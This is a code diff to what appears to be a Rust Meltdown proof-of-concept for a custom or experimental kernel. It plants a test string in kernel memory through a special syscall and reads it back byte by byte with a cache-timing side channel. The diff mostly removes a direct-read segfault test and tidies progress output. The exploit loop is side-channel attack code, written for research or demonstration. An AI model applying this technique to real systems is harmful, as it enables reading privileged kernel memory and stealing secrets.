@@ -22,7 +22,6 @@ use sjlj::{setjmp, longjmp, JumpBuf};
 use spin::{Mutex};
 
 static jump_buf: Mutex<JumpBuf> = Mutex::new(JumpBuf::new());
-static jump_buf_direct_read: Mutex<JumpBuf> = Mutex::new(JumpBuf::new());
 
 const PAGE_SIZE: usize = 256;
 
@@ -144,18 +143,14 @@ impl SignalHandler for SegfaultHandler {
 // Debugging only, to be replaced by a struct with SignalHandler trait
 pub fn handle_signal() {
 	unsafe {
-		if let Some(ref mut buf) = jump_buf_direct_read.try_lock() {
-			longjmp(&mut *buf, 1);
-		} else {
-			longjmp(&mut *jump_buf.lock(), 1);
-		}
+		longjmp(&mut *jump_buf.lock(), 1);
 	}
 }
 
 pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
 	//println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
 	for iteration in 0..config.retries {
-		print!("  {}\x1b[1D\x1b[1D\x1b[1D", iteration / 1000);
+		print!(" {}\x1b[1D\x1b[1D", iteration % 10);
 		unsafe {
 			if setjmp(&mut *jump_buf.lock()) == 0 {
 				meltdown_fast(mem, pointer);
@@ -180,6 +175,7 @@ pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, 
 		}
 		syscall(ThreadSwitch, &[]); // Apparently this is important, see above
 	}
+	println!("All values were 0");
 	return 0; // Maybe this means to only return 0 (first entry) after ensuring it was not one of the other values?
 }
 
@@ -326,29 +322,7 @@ pub fn main() {
 	
 	const secret_string: &str = "Whoever reads this is dumb.";
 	let SECRET = syscall(MeltdownCopyToKernelMemory, &[secret_string.as_ptr() as usize, secret_string.len() as usize]).expect("Syscall did not return value of secret in kernel space!") as *const u8;
-	
-	println!("Trying to read secret from address {:?} directly, expecting segmentation fault", SECRET);
-	let secret_string_kernel;
-	unsafe {
-		secret_string_kernel = String::from_raw_parts(SECRET as *mut u8, secret_string.len(), secret_string.len());
-	}
-	
-	println!("Successfully created string object at address {:p}, content at {:p}, trying to read secret...", &secret_string_kernel, secret_string_kernel.as_ptr());
-	
-	unsafe {
-		if setjmp(&mut *jump_buf_direct_read.lock()) == 0 {
-			//println!("{}", secret_string_kernel);
-			println!("No segmentation fault!");
-		} else {
-			println!("Got segmentation fault!");
-		}
-	}
-	
-	// Prevent using this buffer again, as we're past that now
-	// TODO: This could be less hacky
-	let lock = jump_buf_direct_read.lock();
-	
-	print!("Trying to read secret from address {:?} using meltdown...\nExpected: {}\n     Got: ", SECRET, secret_string);
+	print!("Trying to read secret from address {:?}.\nGot: ", SECRET);
 	
 	let mut index: usize = 0;
 	while index < secret_string.len() {
@@ -357,7 +331,7 @@ pub fn main() {
 			pointer = SECRET.add(index);
 		}
 		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
-		print!("{}", value as u8 as char); // Clear 7 characters right of the cursor (1 space, 'c' for interrupt information, up to 5 digits of iteration count
+		print!("{}", value as u8 as char);
 		/*unsafe {
 			println!("Got value at address {:?}: {} real: {}", pointer, value, *pointer);
 		}*/
